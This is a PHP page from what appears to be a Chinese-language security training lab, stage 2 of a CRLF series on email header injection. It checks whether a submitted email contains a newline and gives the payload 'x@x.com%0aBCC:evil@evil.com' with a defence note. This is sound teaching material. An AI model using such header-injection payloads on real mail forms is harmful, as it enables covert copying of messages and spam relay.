<?php
// 第 2 关：邮件注入
require_once dirname(__DIR__, 2) . '/config.php';
require_once APP_ROOT . '/includes/crlf_helper.php';
if (empty($_SESSION['user'])) { header('Location: /login.php'); exit; }
$level = get_level(); $email = $_GET['email'] ?? ''; $passed = false;
if ($email) {
    if ($level === 'impossible') { $email = str_replace(["\r","\n","%0d","%0a"], '', $email); $passed = false; }
    else { if (strpos($email, "\n") !== false || strpos($email, "%0a") !== false) $passed = true; }
}
if ($passed) pass_stage('crlf',2,'email='.$email);
crlf_head(2, '邮件注入', 'mail函数注入BCC');
?>
<form method="get" class="lab"><div class="row"><label>邮箱</label><input type="text" name="email" value="<?= h($email) ?>" style="width:340px"></div><div class="row"><input type="submit" value="发送"></div></form>
<?php if ($passed) crlf_pass(true); ?>
<?php
crlf_tail(['hint' => '注入换行添加BCC', 'full' => 'email=test@test.com%0aBCC:evil@evil.com'], [
    '原理' => 'CRLF第2关：mail注入BCC',
    '漏洞代码' => '<pre>mail($to,$subj,$body);</pre>',
    '攻击演示' => 'payload: email=x@x.com%0aBCC:evil@evil.com',
    'payload详解' => 'email=x@x.com%0aBCC:evil@evil.com<br>注入BCC',
    '工具实操' => 'Burp调试',
    '通关检测' => '触发效果即通关',
    '防御修复' => '过滤换行+验证邮箱格式',
    '知识卡片' => 'CRLF·邮件注入'
], __FILE__);
